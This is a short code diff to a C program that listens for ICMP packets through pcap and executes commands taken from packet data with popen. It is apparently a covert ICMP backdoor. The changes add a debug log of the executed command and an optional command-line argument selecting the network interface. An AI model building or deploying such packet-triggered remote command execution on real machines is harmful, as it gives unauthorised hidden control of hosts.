@@ -282,6 +282,7 @@ void run_command(const unsigned char *command, uint32_t size, const struct ip_hd
 	memset(buf, 0, sizeof(buf));
 
 	// Execute the command
+  DEBUG_WRAP(fprintf(stderr, "Executing command: %s", cmd));
 	if((fd = popen((char *)cmd, "r")) != NULL) {
 		while((read = fread(buf, 1, MAX_PACKET_SIZE, fd)) > 0) {
 
@@ -395,25 +396,31 @@ int main(int argc, char **argv) {
 	struct bpf_program fp;
 	bpf_u_int32 mask, net;
 	char bpf_filter[] = "icmp";
+  char *interface = (char *)INTERFACE;
 
 	// Seed random for later
 	srand(time(NULL));
 
+  // Use a different interface if it's specified
+  if(argc == 2) {
+    interface = argv[1];
+  }
+
 	// Opening the pcap device
-	if((handle = pcap_open_live(INTERFACE, BUFSIZ, 0, 1000, errbuf)) == NULL) {
-		DEBUG_WRAP(fprintf(stderr, "Error opening device %s: %s\n", INTERFACE, errbuf));
+	if((handle = pcap_open_live(interface, BUFSIZ, 0, 1000, errbuf)) == NULL) {
+		DEBUG_WRAP(fprintf(stderr, "Error opening device %s: %s\n", interface, errbuf));
 		return -1;
 	}
 
 	// Need some extra information about the network interface
-	if(pcap_lookupnet(INTERFACE, &net, &mask, errbuf)) {
-		DEBUG_WRAP(fprintf(stderr, "Error getting interface information for %s: %s\n", INTERFACE, errbuf));
+	if(pcap_lookupnet(interface, &net, &mask, errbuf)) {
+		DEBUG_WRAP(fprintf(stderr, "Error getting interface information for %s: %s\n", interface, errbuf));
 		return -1;
 	}
 
 	// Make sure we got information
 	if((mask == 0) || (net == 0)) {
-		DEBUG_WRAP(fprintf(stderr, "Error getting interface information for %s\n", INTERFACE));
+		DEBUG_WRAP(fprintf(stderr, "Error getting interface information for %s\n", interface));
 		return -1;
 	}
 
